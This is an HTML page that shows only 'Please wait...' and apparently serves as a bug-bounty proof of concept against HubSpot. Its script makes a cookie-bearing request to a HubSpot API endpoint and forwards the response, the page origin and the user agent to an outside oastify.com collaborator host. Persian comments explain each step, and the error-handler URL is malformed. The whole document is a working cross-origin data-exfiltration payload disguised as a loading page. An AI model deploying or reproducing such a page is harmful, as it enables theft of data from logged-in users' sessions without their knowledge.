<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>Please wait...</h1>
    <script>
    // درخواست به API هاب‌اسپات با کوکی‌های کاربر
    fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
        method: 'POST',
        credentials: 'include',  // کوکی‌ها همراه درخواست میرن
        headers: {
            'Content-Type': 'application/json',
            'Origin': 'https://zeynaal.github.io'
        },
        body: JSON.stringify([{
            event: 'page_view',
            properties: {
                url: window.location.href,
                timestamp: new Date().toISOString()
            }
        }])
    })
    .then(response => {
        // دریافت پاسخ از سرور
        return response.text();
    })
    .then(data => {
        // ارسال پاسخ به Collaborator شما
        fetch('https://1uwsoqvx198y1ot2gzpz6vpft6zxnobd.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                response: data,
                origin: window.location.origin,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString()
            })
        });
    })
    .catch(error => {
        // اگر خطایی رخ داد، به Collaborator اطلاع بده
        fetch('https://https://1uwsoqvx198y1ot2gzpz6vpft6zxnobd.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                error: error.toString(),
                origin: window.location.origin
            })
        });
    });
    </script>
</body>
</html>
